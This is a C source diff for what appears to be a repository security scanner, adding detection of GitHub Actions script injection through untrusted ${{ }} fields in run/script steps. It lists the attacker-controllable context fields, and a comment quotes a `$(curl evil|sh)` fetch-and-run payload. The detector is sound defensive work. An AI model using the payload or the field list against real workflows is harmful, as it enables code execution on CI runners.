@@ -827,6 +827,89 @@ hlse_manifest_gha_prt(const char *line) {
     return strstr(line, "pull_request_target") != NULL;
 }
 
+/* GitHub Actions script injection — an attacker-controlled ${{}}
+ * expression interpolated into run:/script: text becomes shell code
+ * on the runner (GitHub's own hardening doc lists these fields as
+ * untrusted; the classic `issue title contains $(curl evil|sh)`
+ * pwn-request). Returns the canonical untrusted context path, or
+ * NULL when every expression on the line is safe.                */
+static const char *const GHA_UNTRUSTED[] = {
+    "github.event.issue.title", "github.event.issue.body",
+    "github.event.pull_request.title", "github.event.pull_request.body",
+    "github.event.pull_request.head",      /* .ref .label .repo.*   */
+    "github.event.comment.body",
+    "github.event.review.body", "github.event.review_comment.body",
+    "github.event.pages.",
+    "github.event.head_commit.message",
+    "github.event.head_commit.author",
+    "github.event.commits.", "github.event.discussion.",
+    "github.event.inputs.", "github.event.workflow_run.head_branch",
+    "github.event.workflow_run.head_repository",
+    "github.event.workflow_run.display_title",
+    "github.head_ref", NULL
+};
+
+const char *
+hlse_manifest_gha_inj(const char *line) {
+    const char *p = line;
+    while ((p = strstr(p, "${{")) != NULL) {
+        const char *e = strstr(p + 3, "}}");
+        size_t i;
+        if (!e) break;
+        /* substring match inside the expression — the field is still
+         * substituted when wrapped in format()/contains()/env. The
+         * caller already restricts this to run/script context.       */
+        for (i = 0; GHA_UNTRUSTED[i]; i++) {
+            const char *f = p + 3;
+            size_t kl = strlen(GHA_UNTRUSTED[i]);
+            while (f + kl <= e) {
+                if (strncmp(f, GHA_UNTRUSTED[i], kl) == 0)
+                    return GHA_UNTRUSTED[i];
+                f++;
+            }
+        }
+        p = e + 2;
+    }
+    return NULL;
+}
+
+/* Workflow run-context key: `run:` (steps), `script:` (github-script
+ * action), `beforeScript:`/`afterScript:` (Sonar source-actions).
+ * Returns 1 for a block-scalar form (run: | — the injected text sits
+ * on following lines), 2 for an inline value the caller should scan
+ * itself, 0 otherwise. */
+int
+hlse_manifest_gha_scriptkey(const char *line) {
+    static const char *const KEYS[] = {
+        "run", "script", "beforeScript", "afterScript", NULL
+    };
+    char low[64];
+    size_t i = 0, n = 0;
+    const char *v;
+    /* leading '- ' list marker is legal before the key */
+    if (line[i] == '-' && line[i+1] == ' ') i += 2;
+    while (line[i] && n + 1 < sizeof(low) && line[i] != ':') {
+        if (line[i] == ' ' || line[i] == '\t') return 0; /* key is bare */
+        low[n] = line[i];
+        i++; n++;
+    }
+    if (line[i] != ':') return 0;
+    low[n] = '\0';
+    {
+        size_t k;
+        int hit = 0;
+        for (k = 0; KEYS[k]; k++)
+            if (strcmp(low, KEYS[k]) == 0) { hit = 1; break; }
+        if (!hit) return 0;
+    }
+    v = line + i + 1;
+    while (*v == ' ' || *v == '\t') v++;
+    if (*v == '|' || *v == '>' || *v == '\0' || *v == '\r' ||
+        *v == '\n' || *v == '#')
+        return 1;
+    return 2;
+}
+
 /* .cargo/config.toml toolchain override — rustc-wrapper / runner /
  * linker / pre-build / post-build / rustc replace what executes on
  * every `cargo build` (build-time code-exec primitive). Returns the
